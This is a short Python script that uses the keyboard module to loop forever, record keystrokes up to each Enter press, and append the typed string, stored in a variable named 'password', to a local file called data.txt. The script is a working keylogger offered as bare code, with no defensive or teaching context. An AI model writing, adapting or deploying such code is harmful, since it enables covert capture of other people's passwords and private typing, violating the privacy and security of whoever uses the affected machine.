import keyboard #keyboard module import
path = "data.txt" #define path here
while True:
    with open(path, 'a') as data_file:

        keypress = keyboard.record('enter') #might need to change "keypress" to "events"
        password = list(keyboard.get_typed_strings(keypress))
        
        data_file.write('\n') # New line written before data is written
        data_file.write(password[0])